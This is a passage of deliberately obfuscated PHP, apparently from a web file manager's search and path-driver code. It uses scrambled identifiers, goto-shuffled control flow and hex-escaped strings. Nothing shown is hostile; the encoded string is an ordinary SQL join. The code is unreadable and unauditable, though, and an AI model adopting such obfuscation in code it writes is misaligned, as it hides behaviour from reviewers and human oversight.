DØ½—•ñÅ; a£ßÑÚß­Ì: $d‡Šô×ˆáÛ =& $_SERVER[Ö‘Øù]; if (!$f§²õ‘‘è[$d‡Šô×ˆáÛ[1818]] || $dŸ„â¤ç£½[$d‡Šô×ˆáÛ[364]][$d‡Šô×ˆáÛ[351]] > 1) { return; } $c‚ã¹™’¬Ø = Model($d‡Šô×ˆáÛ[1977])->listData(); goto fÁ¶÷Ğ™­º; fÁ¶÷Ğ™­º: $DÂ¤ÌïğŒÜ = array(); $fŠ×Ó ù–Ç = $f§²õ‘‘è[$d‡Šô×ˆáÛ[1818]]; foreach ($c‚ã¹™’¬Ø as $CÆšÄ¡„”›) { $D©¹Ù½æ×² = $CÆšÄ¡„”›[$d‡Šô×ˆáÛ[28]]; $f»®»ƒæÇñ = str_replace($d‡Šô×ˆáÛ[50], $d‡Šô×ˆáÛ[33], Pinyin::get($D©¹Ù½æ×²)); if (stripos($D©¹Ù½æ×², $fŠ×Ó ù–Ç) !== !1 || stripos($f»®»ƒæÇñ, $fŠ×Ó ù–Ç) !== !1) { $DÂ¤ÌïğŒÜ[] = $CÆšÄ¡„”›[$d‡Šô×ˆáÛ[395]]; } } goto bîÜœ˜ŞŠ; DØ½—•ñÅ: $fî¨Èİ…ö = array_to_keyvalue($fî¨Èİ…ö, $d‡Šô×ˆáÛ[33], $d‡Šô×ˆáÛ[76]); $e‹Æ‹¤×ËÎ = array_unique($fî¨Èİ…ö); $this->_listSearchMerge($dŸ„â¤ç£½, $f§²õ‘‘è, $FÜ¶í‘‚†µ, $e‹Æ‹¤×ËÎ); goto aĞ¸Ÿ‹Õ©’; aĞ¸Ÿ‹Õ©’: } private function _listSearchDesc(&$fÀõŒ¤ÃÊ‹, $dŒ©¬¤Ï‡—, $aƒ¿õ Ñ ¤) { goto d¼šËáç¨œ; a‡¤æàÅ”²: $D–ùø„²È = array_unique($D–ùø„²È); if (!$D–ùø„²È) { return; } $EËÆÇ’¡¥ = array($Cš‡¾¯œåÊ[397] => array($Cš‡¾¯œåÊ[7], $D–ùø„²È), $Cš‡¾¯œåÊ[93] => $Cš‡¾¯œåÊ[446], $Cš‡¾¯œåÊ[372] => array($Cš‡¾¯œåÊ[381], $Cš‡¾¯œåÊ[1820] . $dŒ©¬¤Ï‡—[$Cš‡¾¯œåÊ[1818]] . $Cš‡¾¯œåÊ[1820])); goto c›Üíˆ¶¨ò; d¼šËáç¨œ: $Cš‡¾¯œåÊ =& $_SERVER[Ö‘Øù]; if (!$dŒ©¬¤Ï‡—[$Cš‡¾¯œåÊ[1818]] || $fÀõŒ¤ÃÊ‹[$Cš‡¾¯œåÊ[364]][$Cš‡¾¯œåÊ[351]] > 1) { return; } $D–ùø„²È = $this->listSearchChildren($dŒ©¬¤Ï‡—[$Cš‡¾¯œåÊ[493]]); goto a‡¤æàÅ”²; c›Üíˆ¶¨ò: $f±–Ä‚µÂ… = Model($Cš‡¾¯œåÊ[558])->field($Cš‡¾¯œåÊ[397])->where($EËÆÇ’¡¥)->select(); $Dñëƒ÷š® = array_to_keyvalue($f±–Ä‚µÂ…, $Cš‡¾¯œåÊ[33], $Cš‡¾¯œåÊ[397]); $this->_listSearchMerge($fÀõŒ¤ÃÊ‹, $dŒ©¬¤Ï‡—, $aƒ¿õ Ñ ¤, $Dñëƒ÷š®); goto Aˆí·ÇĞ; Aˆí·ÇĞ: } private function _listSearchGroupTag(&$BéºÖ§ğ–, $eÍŒ¢ÌÆßÂ, $aâÊ´ĞÔ­) { goto a®Ûç“å²È; b”Ñ†ƒ©¿ˆ: $cø‡ê¢—³ç = array(); $A¦ŠÉ„‘¶ = $eÍŒ¢ÌÆßÂ[$aŠ®Åç÷ìÏ[1818]]; foreach ($fÎÄåäÅƒ[$aŠ®Åç÷ìÏ[367]] as $fùùˆ¯‡âª) { $dÏĞÒ«‰òï = $fùùˆ¯‡âª[$aŠ®Åç÷ìÏ[28]]; $f‡¦¡øË‰» = str_replace($aŠ®Åç÷ìÏ[50], $aŠ®Åç÷ìÏ[33], Pinyin::get($dÏĞÒ«‰òï)); if (stripos($dÏĞÒ«‰òï, $A¦ŠÉ„‘¶) !== !1 || stripos($f‡¦¡øË‰», $A¦ŠÉ„‘¶) !== !1) { $cø‡ê¢—³ç[] = $fùùˆ¯‡âª[$aŠ®Åç÷ìÏ[395]]; } } goto eñÉ˜ºàŸ’; eñÉ˜ºàŸ’: if (!$cø‡ê¢—³ç) { return; } $eÒÎª‘Şğ = array($aŠ®Åç÷ìÏ[421] => array($aŠ®Åç÷ìÏ[7], $cø‡ê¢—³ç), $aŠ®Åç÷ìÏ[1561] => 0, $aŠ®Åç÷ìÏ[29] => $aŠ®Åç÷ìÏ[1842] . $cÒƒ‰»Æ·ã); $cÀâ…ÇùÉ = Model($aŠ®Åç÷ìÏ[422])->field($aŠ®Åç÷ìÏ[76])->where($eÒÎª‘Şğ)->select(); goto AÒØ‚Ÿ˜¢£; a®Ûç“å²È: $aŠ®Åç÷ìÏ =& $_SERVER[Ö‘Øù]; if (!$eÍŒ¢ÌÆßÂ[$aŠ®Åç÷ìÏ[1818]] || $BéºÖ§ğ–[$aŠ®Åç÷ìÏ[364]][$aŠ®Åç÷ìÏ[351]] > 1 || !$eÍŒ¢ÌÆßÂ[$aŠ®Åç÷ìÏ[493]]) { return; } $Dš àŒ•± = $this->sourceInfo($eÍŒ¢ÌÆßÂ[$aŠ®Åç÷ìÏ[493]]); goto f Æóˆ¢·ç; f Æóˆ¢·ç: if (!$Dš àŒ•± || $Dš àŒ•±[$aŠ®Åç÷ìÏ[406]] != SourceModel::TYPE_GROUP) { return; } $cÒƒ‰»Æ·ã = $Dš àŒ•±[$aŠ®Åç÷ìÏ[499]]; $fÎÄåäÅƒ = Model($aŠ®Åç÷ìÏ[1978])->get($cÒƒ‰»Æ·ã); goto b”Ñ†ƒ©¿ˆ; AÒØ‚Ÿ˜¢£: $cÀâ…ÇùÉ = array_to_keyvalue($cÀâ…ÇùÉ, $aŠ®Åç÷ìÏ[33], $aŠ®Åç÷ìÏ[76]); $CŸ“•ÊÕ‚Â = array_unique($cÀâ…ÇùÉ); $this->_listSearchMerge($BéºÖ§ğ–, $eÍŒ¢ÌÆßÂ, $aâÊ´ĞÔ­, $CŸ“•ÊÕ‚Â); goto b¬´õ‹ÄøÉ; b¬´õ‹ÄøÉ: } private function _listSearchMerge(&$b–‚¿¡ÇäÛ, $CÒ¤Ë×æˆ, $Bè²Ê“­èŒ, $FËÍ­×µ„) { goto eîå†ÜĞÜ; eîå†ÜĞÜ: $C»±É’ù¯í =& $_SERVER[Ö‘Øù]; if (!$FËÍ­×µ„) { return; } $DàäáŞŒµï = array_to_keyvalue($b–‚¿¡ÇäÛ[$C»±É’ù¯í[367]], $C»±É’ù¯í[33], $C»±É’ù¯í[397]); goto BöÂ¼°Á; e†é®Åãøõ: foreach ($e¤¸’‡ŒÜ as $eó©„¹‘˜) { if ($this->_listSearchFilter($eó©„¹‘˜, $CÒ¤Ë×æˆ)) { $AºÍ±„ •´[] = $eó©„¹‘˜; } } $b–‚¿¡ÇäÛ[$C»±É’ù¯í[367]] = array_merge($AºÍ±„ •´, $b–‚¿¡ÇäÛ[$C»±É’ù¯í[367]]); $b–‚¿¡ÇäÛ[$C»±É’ù¯í[364]][$C»±É’ù¯í[365]] += count($AºÍ±„ •´); goto C›ÍŸñ±¬“; Dä¹øµÌ™: $e¤¸’‡ŒÜ = $this->field($Bè²Ê“­èŒ)->where($B¬…ºµ¤¦¡)->select(); if (!$e¤¸’‡ŒÜ) { return; } $AºÍ±„ •´ = array(); goto e†é®Åãøõ; BöÂ¼°Á: $cÈ§ğˆéİ = array_diff($FËÍ­×µ„, $DàäáŞŒµï); if (!$cÈ§ğˆéİ) { return; } $B¬…ºµ¤¦¡ = array($C»±É’ù¯í[397] => array($C»±É’ù¯í[7], $cÈ§ğˆéİ)); goto Dä¹øµÌ™; C›ÍŸñ±¬“: } private function _listSearchFilter($e§ °õ¦¸Ê, $AŠŸ¨Á…Å) { goto cà¹ËÃíƒã; cà¹ËÃíƒã: $eíËçŠÆ =& $_SERVER[Ö‘Øù]; $A‹™‹‘Ù¶Ó = $e§ °õ¦¸Ê[$eíËçŠÆ[405]] == $eíËçŠÆ[87]; if (!strstr($e§ °õ¦¸Ê[$eíËçŠÆ[516]], $eíËçŠÆ[47] . $AŠŸ¨Á…Å[$eíËçŠÆ[493]] . $eíËçŠÆ[47])) { return !1; } goto f·ì£ÌŠ±µ; f·ì£ÌŠ±µ: if (isset($AŠŸ¨Á…Å[$eíËçŠÆ[407]]) && $AŠŸ¨Á…Å[$eíËçŠÆ[407]] != $eíËçŠÆ[1784]) { if ($AŠŸ¨Á…Å[$eíËçŠÆ[407]] == $eíËçŠÆ[77] && !$A‹™‹‘Ù¶Ó) { return !1; } if ($AŠŸ¨Á…Å[$eíËçŠÆ[407]] != $eíËçŠÆ[77] && $A‹™‹‘Ù¶Ó) { return !1; } if (!strstr($e§ °õ¦¸Ê[$eíËçŠÆ[168]], $eíËçŠÆ[47] . $AŠŸ¨Á…Å[$eíËçŠÆ[407]] . $eíËçŠÆ[47])) { return !1; } } if (isset($AŠŸ¨Á…Å[$eíËçŠÆ[1979]]) && $AŠŸ¨Á…Å[$eíËçŠÆ[1979]] < $e§ °õ¦¸Ê[$eíËçŠÆ[78]]) { return !1; } if (isset($AŠŸ¨Á…Å[$eíËçŠÆ[1980]]) && $AŠŸ¨Á…Å[$eíËçŠÆ[1980]] > $e§ °õ¦¸Ê[$eíËçŠÆ[78]]) { return !1; } goto EÊİ•¥è¿„; EÊİ•¥è¿„: if (isset($AŠŸ¨Á…Å[$eíËçŠÆ[589]]) && $AŠŸ¨Á…Å[$eíËçŠÆ[589]] != $e§ °õ¦¸Ê[$eíËçŠÆ[449]]) { return !1; } return !0; goto CùÂŠ“µ; CùÂŠ“µ: } public function listSearchChildren($A¹äù»ˆÓğ, $BÊÎ÷šÛÚ = 5000) { goto dùÄ´Û¾¬à; A‡™àİçç‚: $bë×³‰ ’„ = $this->field($E½‘°†¸â‡[397])->where($c»šÆË¬É†)->select(); $dĞ¥î‡Œ¿Ë = array_to_keyvalue($bë×³‰ ’„, $E½‘°†¸â‡[33], $E½‘°†¸â‡[397]); return $dĞ¥î‡Œ¿Ë; goto a†¤æŠø¢‰; FĞÒ×ÃË˜§: $c»šÆË¬É† = array($E½‘°†¸â‡[516] => array($E½‘°†¸â‡[381], $cœ¤´äÍĞë[$E½‘°†¸â‡[516]] . $cœ¤´äÍĞë[$E½‘°†¸â‡[397]] . $E½‘°†¸â‡[540])); $dÅ÷ñÇ›¸ = $this->field($E½‘°†¸â‡[397])->cache(null, 600)->where($c»šÆË¬É†)->count(); if ($dÅ÷ñÇ›¸ > $BÊÎ÷šÛÚ) { return $this->_listSearchChildrenNear($A¹äù»ˆÓğ, $BÊÎ÷šÛÚ); } goto A‡™àİçç‚; dùÄ´Û¾¬à: $E½‘°†¸â‡ =& $_SERVER[Ö‘Øù]; $dĞ¥î‡Œ¿Ë = array(); $cœ¤´äÍĞë = $this->sourceInfo($A¹äù»ˆÓğ); goto FĞÒ×ÃË˜§; a†¤æŠø¢‰: } private function _listSearchChildrenNear($B… Í¢ìä¥, $dÖÊ–‡®˜Ã) { goto D£…¡íö; f®©Áºæ¯œ: $e˜ÚİÈ‚ô = $this->field($eè’Ş÷Ã·[1981])->where($B¯¡›”’¤)->select(); $C­¦¦‹ß›Ô = array_to_keyvalue(array_filter_by_field($e˜ÚİÈ‚ô, $eè’Ş÷Ã·[405], $eè’Ş÷Ã·[87]), $eè’Ş÷Ã·[33], $eè’Ş÷Ã·[397]); $b­”øá¡Ê§ = array_merge($b­”øá¡Ê§, array_to_keyvalue($e˜ÚİÈ‚ô, $eè’Ş÷Ã·[33], $eè’Ş÷Ã·[397])); goto c¾¼Áµ¯­ˆ; c¾¼Áµ¯­ˆ: if (!$C­¦¦‹ß›Ô) { return $b­”øá¡Ê§; } $B¯¡›”’¤ = array($eè’Ş÷Ã·[493] => array($eè’Ş÷Ã·[7], $C­¦¦‹ß›Ô)); $e˜ÚİÈ‚ô = $this->field($eè’Ş÷Ã·[1981])->where($B¯¡›”’¤)->limit($dÖÊ–‡®˜Ã)->select(); goto B¡…ÛÑ…®; D£…¡íö: $eè’Ş÷Ã· =& $_SERVER[Ö‘Øù]; $b­”øá¡Ê§ = array(); $B¯¡›”’¤ = array($eè’Ş÷Ã·[493] => $B… Í¢ìä¥); goto f®©Áºæ¯œ; B¡…ÛÑ…®: $b­”øá¡Ê§ = array_merge($b­”øá¡Ê§, array_to_keyvalue($e˜ÚİÈ‚ô, $eè’Ş÷Ã·[33], $eè’Ş÷Ã·[397])); $b­”øá¡Ê§ = array_slice($b­”øá¡Ê§, 0, $dÖÊ–‡®˜Ã); return $b­”øá¡Ê§; goto cÅ¸ôÛñ¨¾; cÅ¸ôÛñ¨¾: } private function _listSearchBindPinyin($d„Ãî•­›æ, &$CÎ½‚â«œ, &$Aˆñ¦ñÌ–—) { goto fÄàçÉ¼¤Á; fÄàçÉ¼¤Á: $fí«“áÁÄ =& $_SERVER[Ö‘Øù]; if (!isset($d„Ãî•­›æ[$fí«“áÁÄ[1818]]) || !$d„Ãî•­›æ[$fí«“áÁÄ[1818]]) { return; } if (!Input::check($d„Ãî•­›æ[$fí«“áÁÄ[1818]], $fí«“áÁÄ[316]) || strlen($d„Ãî•­›æ[$fí«“áÁÄ[1818]]) < 2) { return; } goto f‰§êƒí÷µ; C¹…Êî¾°Ë: $CÎ½‚â«œ = $dŸ½š¾‚±ê; goto CíâôÅÉ; f‰§êƒí÷µ: $cƒ“ƒÖù = "\x4c\x45\106\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\163\157\x75\x72\x63\145\137\x6d\x65\x74\x61\40\155\145\164\141\x20\x6f\156\40\163\x6f\x75\162\143\x65\56\x73\157\x75\x72\143\145\x49\104\x20\75\x20\155\145\x74\x61\56\x73\x6f\165\x72\143\x65\x49\104"; $dŸ½š¾‚±ê = array(); $Aˆñ¦ñÌ–— = str_replace(array($fí«“áÁÄ[229], $fí«“áÁÄ[50], $fí«“áÁÄ[1982]), $fí«“áÁÄ[33], $Aˆñ¦ñÌ–—); goto A×ÌË¡ø¤…; A×ÌË¡ø¤…: $Aˆñ¦ñÌ–— = $fí«“áÁÄ[431] . str_replace($fí«“áÁÄ[47], $fí«“áÁÄ[432], $Aˆñ¦ñÌ–—); $Aè»õˆœÅÜ = $CÎ½‚â«œ[$fí«“áÁÄ[28]]; unset($CÎ½‚â«œ[$fí«“áÁÄ[28]]); goto cè†ç¶ª ; cè†ç¶ª : foreach ($CÎ½‚â«œ as $a©’”àëÚŞ => $c—¤éæÊ¸) { $dŸ½š¾‚±ê[$fí«“áÁÄ[431] . $a©’”àëÚŞ] = $c—¤éæÊ¸; } foreach ($Aè»õˆœÅÜ as $fÄ“‰÷Š±) { $dŸ½š¾‚±ê[] = array($fí«“áÁÄ[436] => $fÄ“‰÷Š±, $fí«“áÁÄ[993] => $fí«“áÁÄ[1822], array($fí«“áÁÄ[1983] => $fÄ“‰÷Š±, $fí«“áÁÄ[1984] => array($fí«“áÁÄ[7], array($fí«“áÁÄ[459], $fí«“áÁÄ[458])))); } $this->join($cƒ“ƒÖù); goto C¹…Êî¾°Ë; CíâôÅÉ: } private function _parseSearchWhere($cÔ…£ÆÆåà) { goto FÀ©Ê©”À ; D…õÅ³Ö…: if (isset($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[491]]) && $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[491]]) { $C…¬ô¨†½Æ = array($AÅÙŠÄ‡Â‹[1986], $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[491]]); if ($A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[84]]) { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[84]] = array($A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[84]], $C…¬ô¨†½Æ, $AÅÙŠÄ‡Â‹[1987]); } else { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[84]] = $C…¬ô¨†½Æ; } } if (isset($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1979]]) && $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1979]] > 0) { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[78]] = array($AÅÙŠÄ‡Â‹[1985], $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1979]]); } if (isset($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1980]]) && $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1980]]) { $C…¬ô¨†½Æ = array($AÅÙŠÄ‡Â‹[1986], $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1980]]); if ($A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[78]]) { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[78]] = array($A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[78]], $C…¬ô¨†½Æ, $AÅÙŠÄ‡Â‹[1987]); } else { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[78]] = $C…¬ô¨†½Æ; } } goto Bëµšâ–º”; FÀ©Ê©”À : $AÅÙŠÄ‡Â‹ =& $_SERVER[Ö‘Øù]; $A¾ÅĞÈÊ… = array(); if (isset($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[754]]) && $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[754]]) { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[84]] = array($AÅÙŠÄ‡Â‹[1985], $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[754]]); } goto D…õÅ³Ö…; aÎëôÖéê: if (isset($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1818]]) && trim($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1818]])) { $F¿ò˜ÍŒ = trim($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[1818]]); $E×Òë„¹ñá = explode($AÅÙŠÄ‡Â‹[50], $F¿ò˜ÍŒ); if (strlen($F¿ò˜ÍŒ) > 2 && (substr($F¿ò˜ÍŒ, 0, 1) == $AÅÙŠÄ‡Â‹[116] && substr($F¿ò˜ÍŒ, -1) == $AÅÙŠÄ‡Â‹[116]) || substr($F¿ò˜ÍŒ, 0, 1) == $AÅÙŠÄ‡Â‹[55] && substr($F¿ò˜ÍŒ, -1) == $AÅÙŠÄ‡Â‹[55]) { $F¿ò˜ÍŒ = substr($F¿ò˜ÍŒ, 1, -1); $E×Òë„¹ñá = array($F¿ò˜ÍŒ); } $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[28]] = array(array($AÅÙŠÄ‡Â‹[539], $AÅÙŠÄ‡Â‹[1820] . $F¿ò˜ÍŒ . $AÅÙŠÄ‡Â‹[1820])); if (count($E×Òë„¹ñá) > 1) { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[28]] = array(); foreach ($E×Òë„¹ñá as $FìÑŒ…øƒ†) { if (!trim($FìÑŒ…øƒ†)) { continue; } $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[28]][] = array($AÅÙŠÄ‡Â‹[539], $AÅÙŠÄ‡Â‹[1820] . trim($FìÑŒ…øƒ†) . $AÅÙŠÄ‡Â‹[1820]); } } } return $A¾ÅĞÈÊ…; goto bâ’ÏÈ¬Öà; Bëµšâ–º”: if (isset($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[589]]) && $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[589]]) { $A¾ÅĞÈÊ…[] = array($AÅÙŠÄ‡Â‹[449] => $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[589]], $AÅÙŠÄ‡Â‹[447] => $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[589]], $AÅÙŠÄ‡Â‹[993] => $AÅÙŠÄ‡Â‹[1822]); } if (isset($cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[407]]) && $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[407]]) { $eóËÆÆÀ©ø = $cÔ…£ÆÆåà[$AÅÙŠÄ‡Â‹[407]]; if ($eóËÆÆÀ©ø == $AÅÙŠÄ‡Â‹[77]) { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[405]] = 1; } else { if ($eóËÆÆÀ©ø == $AÅÙŠÄ‡Â‹[1988]) { $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[405]] = 0; } else { if ($eóËÆÆÀ©ø) { $eóËÆÆÀ©ø = is_array($eóËÆÆÀ©ø) ? $eóËÆÆÀ©ø : explode($AÅÙŠÄ‡Â‹[47], $eóËÆÆÀ©ø); $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[407]] = array($AÅÙŠÄ‡Â‹[413], $eóËÆÆÀ©ø); $A¾ÅĞÈÊ…[$AÅÙŠÄ‡Â‹[405]] = 0; } } } } $this->_parseSearchParent($cÔ…£ÆÆåà, $A¾ÅĞÈÊ…); goto aÎëôÖéê; bâ’ÏÈ¬Öà: } private function _parseSearchParent($CÌ•¾î›¼ñ, &$a©õö±¥äÜ) { goto BóÅá¸šòæ; CÁ—’æÖ¯ë: $D„µ¨õâåÇ = count($E…´ÀÈÃì®); if ($D„µ¨õâåÇ <= 1) { return; } $f¶Ÿ¿Ï²Æä = array($BÔª³„ ­[493] => 0, $BÔª³„ ­[406] => self::TYPE_GROUP, $BÔª³„ ­[499] => array($BÔª³„ ­[7], $E…´ÀÈÃì®)); goto FÉ„š«å¯¡; A‡Ø‚–ŒÅ¾: $a©õö±¥äÜ[$BÔª³„ ­[579]][] = $BÔª³„ ­[1822]; goto FÔµé©—è; E”¨ôôÜ: $eŒ£Ÿ³‹ = $b”öÙ‹ ƒÔ[$BÔª³„ ­[493]] . $BÔª³„ ­[33] === $BÔª³„ ­[191]; $Cæ‰áÙ ¬ = $b”öÙ‹ ƒÔ[$BÔª³„ ­[406]] == $BÔª³„ ­[510]; $a©õö±¥äÜ[$BÔª³„ ­[579]] = array($BÔª³„ ­[539], $b”öÙ‹ ƒÔ[$BÔª³„ ­[516]] . $CÌ•¾î›¼ñ[$BÔª³„ ­[493]] . $BÔª³„ ­[540]); goto BÅÆ©¿Êª; CËÓêÚ: $eÖßİßàÔÄ = $b”öÙ‹ ƒÔ[$BÔª³„ ­[499]] . $BÔª³„ ­[33]; if ($eÖßİßàÔÄ == $BÔª³„ ­[87]) { unset($a©õö±¥äÜ[$BÔª³„ ­[579]]); $a©õö±¥äÜ[$BÔª³„ ­[406]] = self::TYPE_GROUP; return; } $E…´ÀÈÃì® = Model($BÔª³„ ­[517])->groupChildrenAll($eÖßİßàÔÄ); goto CÁ—’æÖ¯ë; FÉ„š«å¯¡: $dßäÈÊæëŠ = $this->field($BÔª³„ ­[1989])->where($f¶Ÿ¿Ï²Æä)->limit($D„µ¨õâåÇ)->select(); $a©õö±¥äÜ[$BÔª³„ ­[579]] = array(); foreach ($dßäÈÊæëŠ as $dÔ­Åšˆ) { $a©õö±¥äÜ[$BÔª³„ ­[579]][] = array($BÔª³„ ­[539], $BÔª³„ ­[526] . $dÔ­Åšˆ[$BÔª³„ ­[397]] . $BÔª³„ ­[540]); } goto A‡Ø‚–ŒÅ¾; BóÅá¸šòæ: $BÔª³„ ­ =& $_SERVER[Ö‘Øù]; if (!isset($CÌ•¾î›¼ñ[$BÔª³„ ­[493]]) || !$CÌ•¾î›¼ñ[$BÔª³„ ­[493]]) { return; } $b”öÙ‹ ƒÔ = $this->pathInfo($CÌ•¾î›¼ñ[$BÔª³„ ­[493]]); goto E”¨ôôÜ; BÅÆ©¿Êª: $EêÈÕˆ‚Å = isset($CÌ•¾î›¼ñ[$BÔª³„ ­[1686]]) && in_array($BÔª³„ ­[510], $CÌ•¾î›¼ñ[$BÔª³„ ­[1686]]); if (!$EêÈÕˆ‚Å || !$Cæ‰áÙ ¬ || !$eŒ£Ÿ³‹ || !$b”öÙ‹ ƒÔ[$BÔª³„ ­[408]]) { return; } if (!AuthModel::authCheckRoot($b”öÙ‹ ƒÔ[$BÔª³„ ­[408]][$BÔª³„ ­[409]])) { return; } goto CËÓêÚ; FÔµé©—è: } } goto b›Òİ×ÁÇ¯; c¤¤öÄì©: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BÂº¿Ò™‹‘ =& $_SERVER[Ö‘Øù]; $this->objectDriver = array($BÂº¿Ò™‹‘[57], $BÂº¿Ò™‹‘[58], $BÂº¿Ò™‹‘[59], $BÂº¿Ò™‹‘[60], $BÂº¿Ò™‹‘[61], $BÂº¿Ò™‹‘[62], $BÂº¿Ò™‹‘[63], $BÂº¿Ò™‹‘[64], $BÂº¿Ò™‹‘[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($eµ÷¹ÔÎàÃ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($eµ÷¹ÔÎàÃ, $_SERVER[Ö‘Øù][8]); } return $eµ÷¹ÔÎàÃ; } public function iconvApp($d­ºõ¹©é–) { return $d­ºõ¹©é–; } public function iconvSystem($D‹šÌ³ÛÑœ) { return $D‹šÌ³ÛÑœ; } public function iconvTo($côŠÛøŞ¼¯, $EšÍ¢’Ò–, $fÁ÷‡»¤) { goto bÀ¥Öæ»³…; AÉ†Ç³„œÎ: return $A¿¬öèÉğ§; goto C¿™ğĞöĞŠ; Aô¨å£ùÚ…: $AÌ©£Ã¿ = $EšÍ¢’Ò– . $Aä”‰Š˜»[67] . $fÁ÷‡»¤ . $Aä”‰Š˜»[68] . $côŠÛøŞ¼¯; if (isset($c‹Ğ¨ˆ½ô¦[$AÌ©£Ã¿])) { return $c‹Ğ¨ˆ½ô¦[$AÌ©£Ã¿]; } if (function_exists($Aä”‰Š˜»[69])) { $A¿¬öèÉğ§ = @mb_convert_encoding($côŠÛøŞ¼¯, $fÁ÷‡»¤, $EšÍ¢’Ò–); } else { $A¿¬öèÉğ§ = @iconv($EšÍ¢’Ò–, $fÁ÷‡»¤, $côŠÛøŞ¼¯); } goto D‹…Ø²ĞŒ¼; bÀ¥Öæ»³…: $Aä”‰Š˜» =& $_SERVER[Ö‘Øù]; if (!$côŠÛøŞ¼¯ || !function_exists($Aä”‰Š˜»[66])) { return $côŠÛøŞ¼¯; } static $c‹Ğ¨ˆ½ô¦ = array(); goto Aô¨å£ùÚ…; BŠ…Õó Ü³: $c‹Ğ¨ˆ½ô¦[$fÁ÷‡»¤ . $Aä”‰Š˜»[67] . $EšÍ¢’Ò– . $Aä”‰Š˜»[68] . $côŠÛøŞ¼¯] = $côŠÛøŞ¼¯; $c‹Ğ¨ˆ½ô¦[$fÁ÷‡»¤ . $Aä”‰Š˜»[67] . $EšÍ¢’Ò– . $Aä”‰Š˜»[68] . $A¿¬öèÉğ§] = $côŠÛøŞ¼¯; $c‹Ğ¨ˆ½ô¦[$EšÍ¢’Ò– . $Aä”‰Š˜»[67] . $fÁ÷‡»¤ . $Aä”‰Š˜»[68] . $A¿¬öèÉğ§] = $A¿¬öèÉğ§; goto AÉ†Ç³„œÎ; D‹…Ø²ĞŒ¼: $A¿¬öèÉğ§ = $A¿¬öèÉğ§ ? $A¿¬öèÉğ§ : $côŠÛøŞ¼¯; if (strstr($A¿¬öèÉğ§, $Aä”‰Š˜»[70])) { $A¿¬öèÉğ§ = str_replace($Aä”‰Š˜»[70], $Aä”‰Š˜»[71], $A¿¬öèÉğ§); } $c‹Ğ¨ˆ½ô¦[$EšÍ¢’Ò– . $Aä”‰Š˜»[67] . $fÁ÷‡»¤ . $Aä”‰Š˜»[68] . $côŠÛøŞ¼¯] = $A¿¬öèÉğ§; goto BŠ…Õó Ü³; C¿™ğĞöĞŠ: } public function getPathInner($b¬‚°íªö) { $e¤¸¤­ã = IO::init($b¬‚°íªö); return $e¤¸¤­ã->path; } public function getPathOuter($AÎœÃœÖ™ã) { $eÇóÇİêè =& $_SERVER[Ö‘Øù]; $f™«‡² = strlen(trim($this->pathBase, $eÇóÇİêè[8])); $AÎœÃœÖ™ã = substr(trim($AÎœÃœÖ™ã, $eÇóÇİêè[8]), $f™«‡²); return $this->pathDriver . $eÇóÇİêè[8] . ltrim($AÎœÃœÖ™ã, $eÇóÇİêè[8]); } public function isParentOf($eë¿¦ß¶¡á, $B·´—¯Ö´) { $bŸ—è¸å«é =& $_SERVER[Ö‘Øù]; $eë¿¦ß¶¡á = rtrim(strtolower($eë¿¦ß¶¡á), $bŸ—è¸å«é[8]) . $bŸ—è¸å«é[8]; $B·´—¯Ö´ = rtrim(strtolower($B·´—¯Ö´), $bŸ—è¸å«é[8]) . $bŸ—è¸å«é[8]; $fíªêÅÀ÷† = strpos($B·´—¯Ö´, $eë¿¦ß¶¡á) === 0; return $fíªêÅÀ÷†; } public function getType() { $dƒÖØË‰¿‘ =& $_SERVER[Ö‘Øù]; $e‹¤çÏŠ¹ï = str_replace($dƒÖØË‰¿‘[72], $dƒÖØË‰¿‘[33], get_class($this)); return strtolower($e‹¤çÏŠ¹ï); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($AÙÉç½ÑÎ², $fˆ–Ûµ²º¦) { $EÒÎÀâ ™¦ =& $_SERVER[Ö‘Øù]; $dçøèğÒæÃ = rtrim($AÙÉç½ÑÎ², $EÒÎÀâ ™¦[8]) . $EÒÎÀâ ™¦[8] . $fˆ–Ûµ²º¦; 